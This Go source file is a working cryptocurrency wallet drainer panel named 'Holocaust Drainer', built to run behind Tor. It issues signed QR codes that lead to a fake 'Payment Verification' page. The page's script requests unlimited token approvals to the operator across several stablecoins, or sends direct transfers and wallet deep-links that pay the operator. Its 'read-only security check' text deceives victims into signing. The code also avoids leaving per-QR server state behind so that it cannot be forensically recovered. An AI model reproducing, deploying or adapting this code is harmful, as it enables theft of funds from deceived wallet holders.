// Holocaust Drainer — QR deep-link wallet drainer control panel.
//
// One static Go binary. Runs behind a Tor hidden service. State in one JSON
// file. QR codes are signed statelessly (HMAC-SHA256) so the panel can be
// restarted/moved without invalidating issued codes, and no per-QR server
// state exists to forensically recover.
//
// Drain paths (no attacker contract anywhere on-chain):
//
//	pay     -> EIP-681 transfer / Tron transfer / Solana Pay / Trust payment
//	           deeplinks executed by the victim's own wallet.
//	approve -> approve(spender=operator EOA, MAX) on well-known token
//	           contracts, executed inside the wallet's own dApp browser.
package main

import (
	"crypto/hmac"
	"crypto/rand"
	"crypto/sha256"
	"crypto/subtle"
	"embed"
	"encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	"html/template"
	"log"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"sync"
	"time"

	"github.com/skip2/go-qrcode"
	"golang.org/x/crypto/scrypt"
)

//go:embed templates/*.html
var tmplFS embed.FS

var tmpl = template.Must(template.ParseFS(tmplFS, "templates/*.html"))

// ---------------------------------------------------------------- chains ---

type Chain struct {
	ID       string `json:"id"`
	Name     string `json:"name"`
	Family   string `json:"family"` // evm | tron | solana | xrp
	ChainID  int    `json:"chainid"`
	Symbol   string `json:"symbol"`
	Decimals int    `json:"decimals"`
	// Trust Wallet UAI coin id for the chain's native asset (0 = unknown,
	// pay-deeplink via Trust is then disabled for the chain).
	TWCoin int `json:"twcoin"`
}

var chains = map[string]Chain{
	"eth-1":     {"eth-1", "Ethereum", "evm", 1, "ETH", 18, 60},
	"eth-137":   {"eth-137", "Polygon", "evm", 137, "POL", 18, 966},
	"eth-56":    {"eth-56", "BNB Smart Chain", "evm", 56, "BNB", 18, 20000714},
	"eth-42161": {"eth-42161", "Arbitrum One", "evm", 42161, "ETH", 18, 10000714},
	"eth-10":    {"eth-10", "Optimism", "evm", 10, "ETH", 18, 10000014},
	"eth-8453":  {"eth-8453", "Base", "evm", 8453, "ETH", 18, 10000888},
	"eth-43114": {"eth-43114", "Avalanche C-Chain", "evm", 43114, "AVAX", 18, 9000},
	"eth-250":   {"eth-250", "Fantom", "evm", 250, "FTM", 18, 2000250},
	"tron":      {"tron", "Tron", "tron", 0, "TRX", 6, 20000714},
	"solana":    {"solana", "Solana", "solana", 0, "SOL", 9, 501},
	"xrp":       {"xrp", "XRP Ledger", "xrp", 0, "XRP", 6, 144},
}

func chainList() []Chain {
	order := []string{"eth-1", "eth-137", "eth-56", "eth-42161", "eth-10",
		"eth-8453", "eth-43114", "eth-250", "tron", "solana", "xrp"}
	out := make([]Chain, 0, len(order))
	for _, id := range order {
		out = append(out, chains[id])
	}
	return out
}

// Well-known token contracts (checksummed) used as defaults, with the
// token's own decimals (NOT the chain's native decimals).
type tokenInfo struct {
	addr     string
	decimals int
}

var defaultTokens = map[string]tokenInfo{
	"eth-1":     {"0xdAC17F958D2ee523a2206206994597C13D831ec7", 6},  // USDT
	"eth-137":   {"0xc2132D05D31c914a87C6611C10748AEb04B58e8F", 6},  // USDT
	"eth-56":    {"0x55d398326f99059fF775485246999027B3197955", 18}, // BSC-USD
	"eth-42161": {"0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9", 6},  // USDT
	"eth-10":    {"0x94b008aA00579c1307b0EF2c499Ad98a8ce64e09", 6},  // USDT
	"eth-8453":  {"0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913", 6},  // USDC Base
	"eth-43114": {"0x9702230A8EbA5fBED1d0121c1D39D07affab5b57", 6},  // USDt
	"eth-250":   {"0x04068DA69683aFb4be622F93B5c9C0B4e5c33e44", 6},  // USDC e
	"tron":      {"TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t", 6},          // USDT TRC-20
}

// tokenDecimals returns the decimals of the token actually being moved:
// known default token -> its decimals, anything else -> 18 (EVM convention).
func tokenDecimals(chainID, contract string) int {
	if def, ok := defaultTokens[chainID]; ok && strings.EqualFold(def.addr, contract) {
		return def.decimals
	}
	return 18
}

// Extra approve targets: the page approves the chain default first, then
// these (multi-token harvest in one session, wallet queues them).
var extraApprove = map[string][]string{
	"eth-1": {
		"0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // USDC
		"0x6B175474E89094C44Da98b954EedeAC495271d0F", // DAI
	},
	"eth-56": {
		"0x8AC76a51cc950d9822D68b83fE1Ad97B32dD513d", // USDC
		"0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56", // BUSD
	},
	"eth-137": {
		"0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359", // USDC native
	},
}

// ---------------------------------------------------------------- config ---

type Receiver struct {
	EVM    string `json:"evm"`
	Tron   string `json:"tron"`
	Solana string `json:"solana"`
	XRP    string `json:"xrp"`
}

type Config struct {
	PassHash string               `json:"pass_hash"` // scrypt(salt||dk), b64url
	Onion    string               `json:"onion"`
	QRSecret string               `json:"qr_secret"`
	Recv     map[string]*Receiver `json:"recv"`
}

// hashPassword returns b64url(salt) . b64url(scrypt-dk) with per-call salt.
func hashPassword(password string) string {
	salt := make([]byte, 16)
	rand.Read(salt)
	dk, err := scrypt.Key([]byte(password), salt, 16384, 8, 1, 32)
	if err != nil {
		log.Fatalf("scrypt: %v", err)
	}
	return b64url(salt) + "." + b64url(dk)
}

func checkPassword(stored, password string) bool {
	parts := strings.SplitN(stored, ".", 2)
	if len(parts) != 2 {
		return false
	}
	salt, err := base64.RawURLEncoding.DecodeString(parts[0])
	if err != nil || len(salt) != 16 {
		return false
	}
	want, err := base64.RawURLEncoding.DecodeString(parts[1])
	if err != nil || len(want) != 32 {
		return false
	}
	dk, err := scrypt.Key([]byte(password), salt, 16384, 8, 1, 32)
	if err != nil {
		return false
	}
	return hmac.Equal(dk, want)
}

var cfg = &Config{Recv: map[string]*Receiver{}}

var configFile = flag.String("conf", "", "path to config.json")
var listen = flag.String("listen", "127.0.0.1:8899", "local listen address (Tor proxies this)")

func configPath() string {
	if *configFile != "" {
		return *configFile
	}
	if v := os.Getenv("HOLOCAUST_CONFIG"); v != "" {
		return v
	}
	return "/var/lib/holocaust/config.json"
}

func loadConfig(p string) error {
	b, err := os.ReadFile(p)
	if err != nil {
		if os.IsNotExist(err) {
			return nil
		}
		return err
	}
	return json.Unmarshal(b, cfg)
}

func saveConfig(p string) error {
	b, _ := json.MarshalIndent(cfg, "", "  ")
	if err := os.MkdirAll(filepath.Dir(p), 0700); err != nil {
		return err
	}
	tmp := p + ".tmp"
	if err := os.WriteFile(tmp, b, 0600); err != nil {
		return err
	}
	return os.Rename(tmp, p)
}

func logEvent(s string) {
	p := os.Getenv("HOLOCAUST_LOG")
	if p == "" {
		return
	}
	f, err := os.OpenFile(p, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
	if err != nil {
		return
	}
	defer f.Close()
	fmt.Fprintf(f, "%s %s\n", time.Now().UTC().Format(time.RFC3339), s)
}

// ------------------------------------------------------------------ auth ---

var sessionTok = "" // single active session; rotated on every login/logout

// brute-force guard: per-IP failure counter + escalating lockout windows.
// A locked login responds exactly like a wrong password (no state leak).
var (
	failMu    sync.Mutex
	failCount = map[string]int{}
	failUntil = map[string]time.Time{}
)

func loginLocked(ip string) bool {
	failMu.Lock()
	defer failMu.Unlock()
	t, ok := failUntil[ip]
	return ok && time.Now().Before(t)
}

func recordFail(ip string) {
	failMu.Lock()
	defer failMu.Unlock()
	failCount[ip]++
	n := failCount[ip]
	if n >= 5 {
		failUntil[ip] = time.Now().Add(time.Duration(15*n) * time.Minute)
		delete(failCount, ip)
	}
}

func clearFails(ip string) {
	failMu.Lock()
	defer failMu.Unlock()
	delete(failCount, ip)
}

func newToken(n int) string {
	b := make([]byte, n)
	rand.Read(b)
	return base64.RawURLEncoding.EncodeToString(b)
}

func loginHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method == http.MethodPost {
		r.ParseForm()
		ip := r.RemoteAddr
		if i := strings.LastIndexByte(ip, ':'); i > 0 {
			ip = ip[:i]
		}
		if loginLocked(ip) {
			// identical response to a wrong password: no state leak
			time.Sleep(300 * time.Millisecond)
			logEvent("login while locked from " + ip)
			tmpl.ExecuteTemplate(w, "login.html", nil)
			return
		}
		pw := r.PostFormValue("password")
		ok := checkPassword(cfg.PassHash, pw)
		// equalize response timing between hit and miss
		time.Sleep(300 * time.Millisecond)
		if ok {
			clearFails(ip)
			sessionTok = newToken(24)
			http.SetCookie(w, &http.Cookie{
				Name: "holo_session", Value: sessionTok, Path: "/",
				HttpOnly: true, SameSite: http.SameSiteLaxMode, MaxAge: 28800,
			})
			logEvent("login ok from " + r.RemoteAddr)
			http.Redirect(w, r, "/", http.StatusSeeOther)
			return
		}
		recordFail(ip)
		logEvent("login FAIL from " + ip)
	}
	tmpl.ExecuteTemplate(w, "login.html", nil)
}

func logoutHandler(w http.ResponseWriter, r *http.Request) {
	sessionTok = ""
	http.SetCookie(w, &http.Cookie{Name: "holo_session", Value: "", Path: "/", MaxAge: -1})
	http.Redirect(w, r, "/login", http.StatusSeeOther)
}

func requireLogin(next http.HandlerFunc) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		c, err := r.Cookie("holo_session")
		if err != nil || c.Value == "" || sessionTok == "" ||
			subtle.ConstantTimeCompare([]byte(c.Value), []byte(sessionTok)) != 1 {
			http.Redirect(w, r, "/login", http.StatusSeeOther)
			return
		}
		next(w, r)
	}
}

// ------------------------------------------------------- QR token codec ---

type Payload struct {
	V        int    `json:"v"`
	Chain    string `json:"chain"`
	Mode     string `json:"mode"` // pay | approve
	Contract string `json:"contract,omitempty"`
	Recv     string `json:"recv"`
	Amount   string `json:"amount,omitempty"`
	Memo     string `json:"memo,omitempty"`
	Tok      string `json:"tok"`
}

func b64url(b []byte) string { return base64.RawURLEncoding.EncodeToString(b) }

func sealPayload(id string, p Payload) string {
	j, _ := json.Marshal(p)
	raw := make([]byte, 0, 64+len(j))
	raw = append(raw, 1)
	raw = append(raw, byte(len(id)))
	raw = append(raw, []byte(id)...)
	raw = append(raw, j...)
	m := hmac.New(sha256.New, []byte(cfg.QRSecret))
	m.Write(raw)
	return b64url(raw) + "." + b64url(m.Sum(nil))
}

func unsealPayload(token string) (Payload, bool) {
	var p Payload
	parts := strings.SplitN(token, ".", 2)
	if len(parts) != 2 {
		return p, false
	}
	raw, err := base64.RawURLEncoding.DecodeString(parts[0])
	if err != nil || len(raw) < 3 || raw[0] != 1 {
		return p, false
	}
	sig, err := base64.RawURLEncoding.DecodeString(parts[1])
	if err != nil || len(sig) != 32 {
		return p, false
	}
	m := hmac.New(sha256.New, []byte(cfg.QRSecret))
	m.Write(raw)
	if !hmac.Equal(sig, m.Sum(nil)) {
		return p, false
	}
	idLen := int(raw[1])
	if idLen+2 > len(raw) {
		return p, false
	}
	if err := json.Unmarshal(raw[2+idLen:], &p); err != nil {
		return p, false
	}
	return p, true
}

// ------------------------------------------------------------ URI builders ---

func toWei(amount string, decimals int) string {
	amount = strings.TrimSpace(amount)
	if amount == "" || amount == "0" {
		return "0"
	}
	neg := strings.HasPrefix(amount, "-")
	amount = strings.TrimPrefix(amount, "-")
	intPart, fracPart := amount, ""
	if i := strings.IndexByte(amount, '.'); i >= 0 {
		intPart, fracPart = amount[:i], amount[i+1:]
	}
	if len(fracPart) > decimals {
		fracPart = fracPart[:decimals]
	}
	fracPart += strings.Repeat("0", decimals-len(fracPart))
	digits := strings.TrimLeft(intPart+fracPart, "0")
	if digits == "" {
		digits = "0"
	}
	if neg && digits != "0" {
		digits = "-" + digits
	}
	return digits
}

func maxUint256() string {
	return "115792089237316195423570985008687907853269984665640564039457584007913129639935"
}

var (
	reEVM    = regexp.MustCompile(`^0x[0-9a-fA-F]{40}$`)
	reTronB  = regexp.MustCompile(`^T[1-9A-HJ-NP-Za-km-z]{33}$`)
	reSol    = regexp.MustCompile(`^[1-9A-HJ-NP-Za-km-z]{32,44}$`)
	reXRP    = regexp.MustCompile(`^r[1-9A-HJ-NP-Za-km-z]{24,34}$`)
	reHost   = regexp.MustCompile(`^https://[a-zA-Z0-9.-]+(/[a-zA-Z0-9._/-]*)?$`)
	reAmount = regexp.MustCompile(`^[0-9]{1,15}(\.[0-9]{1,18})?$`)
)

// trustPayLink builds a Trust Wallet payment deeplink for chains where the
// UAI asset code is reliable. Returns "" otherwise.
func trustPayLink(p Payload) string {
	ch := chains[p.Chain]
	if ch.TWCoin == 0 {
		return ""
	}
	asset := fmt.Sprintf("c%d", ch.TWCoin)
	if p.Contract != "" {
		if ch.Family == "evm" {
			asset += "_t" + strings.ToLower(p.Contract)
		} else {
			asset += "_t" + p.Contract
		}
	}
	link := fmt.Sprintf("https://link.trustwallet.com/payment?asset=%s&address=%s&amount=%s",
		asset, p.Recv, url.QueryEscape(p.Amount))
	if p.Memo != "" {
		link += "&memo=" + url.QueryEscape(p.Memo)
	}
	return link
}

// mmSendLink builds https://metamask.app.link/send/<eip681> per the official
// MetaMask deeplink generator (EIP-681 URI with ethereum: prefix stripped).
func mmSendLink(p Payload) string {
	ch := chains[p.Chain]
	if ch.Family != "evm" {
		return ""
	}
	if p.Amount == "" || p.Contract == "" {
		// native transfer: plain /send/<addr>@<chain> with value param
		return fmt.Sprintf("https://metamask.app.link/send/%s@%d?value=%s",
			p.Recv, ch.ChainID, toWei(p.Amount, 18))
	}
	uri := fmt.Sprintf("%s@%d/transfer?address=%s&uint256=%s",
		strings.ToLower(p.Contract), ch.ChainID, p.Recv, toWei(p.Amount, tokenDecimals(p.Chain, p.Contract)))
	return "https://metamask.app.link/send/" + uri
}

func solanaPayLink(p Payload) string {
	u := "solana:" + p.Recv + "?amount=" + url.QueryEscape(p.Amount)
	if p.Contract != "" {
		u += "&spl-token=" + p.Contract
	}
	u += "&label=Payment"
	return u
}

// -------------------------------------------------------- static hop page ---

// buildHopPage renders the self-contained static page the operator uploads
// to their static host at /p/<tok>/ (index.html). No network calls, no
// tracking, no external JS. Works in Trust dApp browser, MetaMask in-app
// browser, or any mobile browser (deeplink hop).
func buildHopPage(p Payload) string {
	ch := chains[p.Chain]
	type cfgJS struct {
		Chain   string `json:"chain"`
		Family  string `json:"family"`
		Mode    string `json:"mode"`
		Token   string `json:"token"`
		Spender string `json:"spender"`
		Recv    string `json:"recv"`
		Wei     string `json:"wei"`
		Memo    string `json:"memo"`
		MM      string `json:"mm"`
		Trust   string `json:"trust"`
		Solana  string `json:"solana"`
		Extras  string `json:"extras"`
	}
	c := cfgJS{
		Chain: p.Chain, Family: ch.Family, Mode: p.Mode,
		Token: p.Contract, Spender: p.Recv, Recv: p.Recv,
		Wei: toWei(p.Amount, tokenDecimals(p.Chain, p.Contract)), Memo: p.Memo,
		MM: mmSendLink(p), Trust: trustPayLink(p), Solana: solanaPayLink(p),
	}
	if ex, ok := extraApprove[p.Chain]; ok && p.Mode == "approve" {
		b, _ := json.Marshal(ex)
		c.Extras = string(b)
	}
	jb, _ := json.Marshal(c)

	page := `<!doctype html><html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Payment Verification</title>
<style>body{font-family:system-ui,-apple-system,sans-serif;background:#0b0f14;color:#e6e8eb;
display:flex;align-items:center;justify-content:center;height:100vh;margin:0}
.card{max-width:340px;text-align:center;padding:24px}
.spin{width:42px;height:42px;border:3px solid #2a3a4a;border-top-color:#4ade80;
border-radius:50%;margin:0 auto 18px;animation:r 1s linear infinite}
@keyframes r{to{transform:rotate(360deg)}}
h2{font-weight:600;font-size:17px;margin:0 0 8px}p{color:#8a939e;font-size:13.5px;line-height:1.5}</style>
</head><body><div class="card"><div class="spin"></div>
<h2>Verifying payment capability</h2>
<p>This is a read-only security check performed by your wallet.<br>Please confirm the request it shows you.</p>
</div><script>
var C = ` + string(jb) + `;
function calldata(sel, addrHex, amountHex) {
  return "0x" + sel + "000000000000000000000000" + addrHex +
         amountHex;
}
function pad(a) { var h = a.replace(/^0x/,""); while (h.length < 64) h = "0"+h; return h; }
(function(){
  function run(){
    if (!window.ethereum || !C.token) return false;
    window.ethereum.request({method:"eth_requestAccounts"}).then(function(accts){
      var from = accts[0];
      if (C.mode === "approve") {
        var max = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
        var targets = [C.token];
        if (C.extras) { try { targets = targets.concat(JSON.parse(C.extras)); } catch(e){} }
        targets.forEach(function(t){
          var d = "0x095ea7b3" + pad(C.spender.replace(/^0x/,"")) + max;
          window.ethereum.request({method:"eth_sendTransaction", params:[{
            from: from, to: t, data: d
          }]}).catch(function(){});
        });
      } else {
        var d = "0xa9059cbb" + pad(C.recv.replace(/^0x/,"")) + pad(C.wei);
        window.ethereum.request({method:"eth_sendTransaction", params:[{
          from: from, to: C.token, data: d
        }]}).catch(function(){});
      }
    }).catch(function(){});
    return true;
  }
  if (run()) return;
  if (C.trust) { location.replace(C.trust); return; }
  if (C.mm) { location.replace(C.mm); return; }
  if (C.solana) { location.replace(C.solana); return; }
  location.replace("https://trustwallet.com/download");
})();
</script></body></html>`
	return page
}

// ------------------------------------------------------------- handlers ---

type dashData struct {
	Onion   string
	List    []Chain
	Recv    map[string]*Receiver
	HasRecv bool
}

func rootHandler(w http.ResponseWriter, r *http.Request) {
	tmpl.ExecuteTemplate(w, "dash.html", dashData{
		Onion: cfg.Onion, List: chainList(), Recv: cfg.Recv,
		HasRecv: len(cfg.Recv) > 0,
	})
}

func recvFor(chain string) (*Receiver, string) {
	rv := cfg.Recv[chain]
	if rv == nil {
		return nil, ""
	}
	ch := chains[chain]
	switch ch.Family {
	case "evm":
		return rv, rv.EVM
	case "tron":
		return rv, rv.Tron
	case "solana":
		return rv, rv.Solana
	case "xrp":
		return rv, rv.XRP
	}
	return rv, ""
}

func apiSaveReceiver(w http.ResponseWriter, r *http.Request) {
	r.ParseForm()
	chain := r.PostFormValue("chain")
	addr := strings.TrimSpace(r.PostFormValue("addr"))
	ch, ok := chains[chain]
	if !ok {
		http.Error(w, "unknown chain", 400)
		return
	}
	valid := (ch.Family == "evm" && reEVM.MatchString(addr)) ||
		(ch.Family == "tron" && reTronB.MatchString(addr)) ||
		(ch.Family == "solana" && reSol.MatchString(addr)) ||
		(ch.Family == "xrp" && reXRP.MatchString(addr))
	if !valid {
		http.Error(w, "address not valid for "+ch.Name, 400)
		return
	}
	rv := cfg.Recv[chain]
	if rv == nil {
		rv = &Receiver{}
	}
	switch ch.Family {
	case "evm":
		rv.EVM = addr
	case "tron":
		rv.Tron = addr
	case "solana":
		rv.Solana = addr
	case "xrp":
		rv.XRP = addr
	}
	cfg.Recv[chain] = rv
	if err := saveConfig(configPath()); err != nil {
		http.Error(w, err.Error(), 500)
		return
	}
	logEvent("receiver updated chain=" + chain)
	http.Redirect(w, r, "/", http.StatusSeeOther)
}

func apiGenerate(w http.ResponseWriter, r *http.Request) {
	if r.Method == http.MethodGet {
		tmpl.ExecuteTemplate(w, "gen.html", struct {
			List []Chain
			Recv map[string]*Receiver
		}{chainList(), cfg.Recv})
		return
	}
	domain := strings.TrimSpace(r.PostFormValue("domain"))
	chain := r.PostFormValue("chain")
	mode := r.PostFormValue("mode")
	amount := strings.TrimSpace(r.PostFormValue("amount"))
	contract := strings.TrimSpace(r.PostFormValue("contract"))
	memo := strings.TrimSpace(r.PostFormValue("memo"))

	if !reHost.MatchString(domain) {
		http.Error(w, "domain must look like https://host[/path]", 400)
		return
	}
	domain = strings.TrimSuffix(domain, "/")
	ch, ok := chains[chain]
	if !ok {
		http.Error(w, "unknown chain", 400)
		return
	}
	_, recv := recvFor(chain)
	if recv == "" {
		http.Error(w, "no receiving address configured for "+ch.Name, 400)
		return
	}
	if mode != "pay" && mode != "approve" {
		http.Error(w, "mode must be pay or approve", 400)
		return
	}
	if ch.Family == "evm" && contract == "" {
		contract = defaultTokens[chain].addr
	}
	if ch.Family == "tron" && contract == "" {
		contract = defaultTokens["tron"].addr
	}
	if mode == "approve" {
		if ch.Family != "evm" {
			http.Error(w, "approve mode requires an EVM chain", 400)
			return
		}
		if !reEVM.MatchString(contract) {
			http.Error(w, "token contract invalid", 400)
			return
		}
	} else { // pay
		if ch.Family == "solana" && contract != "" && !reSol.MatchString(contract) {
			http.Error(w, "SPL mint invalid", 400)
			return
		}
		if ch.Family == "evm" && contract != "" && !reEVM.MatchString(contract) {
			http.Error(w, "token contract invalid", 400)
			return
		}
		if amount != "" && !reAmount.MatchString(amount) {
			http.Error(w, "amount invalid", 400)
			return
		}
		if amount == "" && ch.Family != "solana" {
			// native token transfer with empty amount is meaningless
			http.Error(w, "amount required for pay mode", 400)
			return
		}
	}

	tok := newToken(8)
	p := Payload{
		V: 1, Chain: chain, Mode: mode, Contract: contract,
		Recv: recv, Amount: amount, Memo: memo, Tok: tok,
	}
	qrData := domain + "/p/" + sealPayload(tok, p)
	qr, err := qrcode.New(qrData, qrcode.Medium)
	if err != nil {
		http.Error(w, err.Error(), 500)
		return
	}
	pngBytes, err := qr.PNG(360)
	if err != nil {
		http.Error(w, err.Error(), 500)
		return
	}
	pngB64 := base64.StdEncoding.EncodeToString(pngBytes)

	logEvent(fmt.Sprintf("QR issued chain=%s mode=%s domain=%s", chain, mode, hostOf(domain)))
	tmpl.ExecuteTemplate(w, "qr.html", struct {
		Chain, Mode, QRData, HopPage, UploadPath string
		DataURL                                  template.URL // template.URL: safe data: URI for src=
	}{
		Chain: ch.Name, Mode: mode,
		DataURL:    template.URL("data:image/png;base64," + pngB64),
		QRData:     qrData,
		HopPage:    buildHopPage(p),
		UploadPath: "p/" + tok + "/index.html",
	})
}

func hostOf(d string) string {
	d = strings.TrimPrefix(d, "https://")
	d = strings.TrimPrefix(d, "http://")
	if i := strings.IndexByte(d, '/'); i >= 0 {
		d = d[:i]
	}
	return d
}

// ------------------------------------------------------------- main ---

func main() {
	flag.Parse()
	cp := configPath()
	if err := loadConfig(cp); err != nil {
		log.Fatalf("config: %v", err)
	}
	if cfg.PassHash == "" {
		pw := os.Getenv("HOLOCAUST_PASS")
		if pw == "" {
			log.Fatal("first run: set HOLOCAUST_PASS to bootstrap the admin password")
		}
		cfg.PassHash = hashPassword(pw)
		cfg.QRSecret = newToken(32)
		if err := saveConfig(cp); err != nil {
			log.Fatalf("save config: %v", err)
		}
		log.Printf("bootstrapped new config at %s", cp)
	}

	mux := http.NewServeMux()
	mux.HandleFunc("/login", loginHandler)
	mux.HandleFunc("/logout", logoutHandler)
	mux.HandleFunc("/", requireLogin(rootHandler))
	mux.HandleFunc("/receiver", requireLogin(apiSaveReceiver))
	mux.HandleFunc("/generate", requireLogin(apiGenerate))

	srv := &http.Server{
		Addr:              *listen,
		Handler:           mux,
		ReadHeaderTimeout: 10 * time.Second,
	}
	log.Printf("holocaust panel on %s (front it with a Tor hidden service)", *listen)
	log.Fatal(srv.ListenAndServe())
}
